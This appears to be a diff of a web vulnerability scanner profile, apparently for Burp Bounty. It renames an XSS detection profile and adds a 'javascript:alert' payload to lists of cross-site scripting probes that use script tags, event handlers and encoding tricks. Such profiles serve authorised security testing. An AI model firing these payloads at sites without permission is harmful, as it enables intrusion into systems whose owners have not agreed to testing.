@@ -1,10 +1,10 @@
 [
   {
-    "ProfileName": "XSS",
+    "ProfileName": "XSS Replace",
     "Name": "",
     "Enabled": true,
     "Scanner": 1,
-    "Author": "@burpbounty",
+    "Author": "@kingjulien",
     "Payloads": [
       "true,\u003c/script\u003e\u003cscript\u003econfirm(1)\u003c/script\u003e",
       "true,\"\u003e\u003cimg src\u003dx onerror\u003dprompt(1);\u003e.",
@@ -19,7 +19,8 @@
       "true,\u003csc%00ript\u003ealert/**/(1)\u003c/script\u003e",
       "true,\u003csvg onload\u003d\u0027new Function`[\"XSS\"].find(al\\u0065rt)`\u0027\u003e",
       "true,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e",
-      "true,%22%26gt%3b%26lt%3bscript%26gt%3balert(%27XSS%27)%26lt%3b/script%26gt%3b%26lt%3b%26%2333%3b%26%2345%3b%26%2345%3b"
+      "true,%22%26gt%3b%26lt%3bscript%26gt%3balert(%27XSS%27)%26lt%3b/script%26gt%3b%26lt%3b%26%2333%3b%26%2345%3b%26%2345%3b",
+      "true,javascript:alert(13)//c13zoth9"
     ],
     "Encoder": [],
     "UrlEncode": false,
@@ -37,7 +38,8 @@
       "true,Or,\u003cscript\u003ealert/**/(1)\u003c/script\u003e",
       "true,Or,\u003csvg onload\u003d\u0027new Function`[\"XSS\"].find(al\\u0065rt)`\u0027\u003e",
       "true,Or,\u003csvg onx\u003d() onload\u003d(confirm)(1)\u003e",
-      "true,Or,\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e"
+      "true,Or,\u003cscript\u003ealert(\u0027XSS\u0027)\u003c/script\u003e",
+      "true,Or,javascript:alert(13)//c13zoth9"
     ],
     "Tags": [
       "All",
@@ -72,10 +74,10 @@
     "MaxRedir": 3,
     "requestType": 1,
     "rawRequest": "",
-    "payloadPosition": 2,
+    "payloadPosition": 1,
     "payloadsFile": "",
     "grepsFile": "",
-    "IssueName": "XSS",
+    "IssueName": "XSS Replace",
     "IssueSeverity": "Medium",
     "IssueConfidence": "Certain",
     "IssueDetail": "\n\n\u003cbr/\u003e\u003cbr/\u003e- PAYLOAD: \u003cbr/\u003e\u003cpayload\u003e\n\u003cbr/\u003e\u003cbr/\u003e\n- GREP: \u003cbr/\u003e\u003cgrep\u003e",
